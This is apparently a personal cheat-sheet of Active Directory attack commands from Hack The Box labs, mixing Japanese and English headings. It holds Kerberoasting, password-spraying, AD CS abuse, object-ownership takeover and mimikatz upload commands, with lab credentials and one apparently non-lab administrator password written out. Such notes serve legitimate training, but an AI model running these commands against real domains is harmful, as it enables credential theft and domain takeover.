
source winrm-venv/bin/activate
SMB共有

[[winpeas]]

[[smbmap]]

[[smbcliant]]

[[bloodhound]]

[[netexec]]

[[ldap]]

[[Certipy]]

[[権限昇格]]
[[mssql]]

┌──(kali㉿kali)-[~/HTB/targetedKerberoast]
└─$ python3 -m venv venv
┌──(kali㉿kali)-[~/HTB/targetedKerberoast]
└─$ source venv/bin/activate

|ESC1〜ESC8|AD CS に存在する構成ミスを悪用|
|TGT取得|証明書ベースで TGT を取得|
|PKINIT Relay|証明書認証を使ったリレー攻撃|
|サブCA列挙・テンプレート列挙|環境把握・脆弱性評価|

sudo ntpdate -u 10.129.243.199

enum4linux -a 10.10.11.35
enum4linux-ng 10.10.11.35

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  'overwatch.htb/sqlsvc:TI0LKcfHzZw1vV@overwatch.htb' \
  -windows-auth -port 6520

python3 /usr/share/doc/python3-impacket/examples/owneredit.py \
-action write \
-target-dn "CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB" \
-new-owner-dn "CN=JUDITH MADER,CN=USERS,DC=CERTIFIED,DC=HTB" \
-dc-ip 10.129.231.186 \
CERTIFIED.HTB/judith.mader:judith09


nmap -p 389 --script ldap-rootdse 10.10.1.76
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py voleur.htb/ryan.naylor:HollowOct31Nyt -dc-ip 10.10.11.76


dig @10.10.11.174 support.htb any

python3 /usr/share/doc/python3-impacket/examples/getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt' -debug
python3 /usr/share/doc/python3-impacket/examples/getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip 10.10.11.76

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py voleur.htb/ryan.naylor -k -no-pass -dc-ip 10.10.11.76 -dc-host dc.voleur.htb -request

ldapsearch -x -H ldap://10.10.11.76 -D "ryan.naylor@voleur.htb" -w 'HollowOct31Nyt' -b "DC=voleur,DC=htb" "(servicePrincipalName=*)"

└─$ python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb          

shares




use //dc.voleur.htb/IT

python3 /usr/share/doc/python3-impacket/examples/getTGT.py naka.local/Administratior:'Nakahara0216' -dc-ip 10.0.3.2


┌──(kali㉿kali)-[~/HTB/voleur]
└─$ crackmapexec smb 10.10.11.76 -u user.txt -p 'HollowOct31Nyt' --continue-on-success

SMB         10.10.11.76     445    10.10.11.76      [*]  x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False)
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\Administrator:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\Guest:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\marie.bryant:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\lacey.miller:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\svc_ldap:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\svc_backup:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\svc_iis:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\svc_winrm:HollowOct31Nyt STATUS_NOT_SUPPORTED 
SMB         10.10.11.76     445    10.10.11.76      [-] 10.10.11.76\jeremy.combs:HollowOct31Nyt STATUS_NOT_SUPPORTED 

crackmapexec smb 10.10.11.76 -u svc_ldap -p top5000.txt --continue-on-success

source ~/certipy-env/bin/activate

certipy find -u ryan.naylor@voleur.htb -p 'HollowOct31Nyt' \
  -target 10.10.11.76 \
  -ldap-scheme ldap -ldap-port 389 \
  -ldap-simple-auth


export KRB5CCNAME=$(pwd)/svc_winrm.ccache

modifying entry "CN=SVC_WINRM,OU=SERVICE ACCOUNTS,DC=VOLEUR,DC=HTB"





dir -Force

*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload mimikatz_trunk/x64/mimikatz.exe C:\Windows\Temp\mimikatz.exe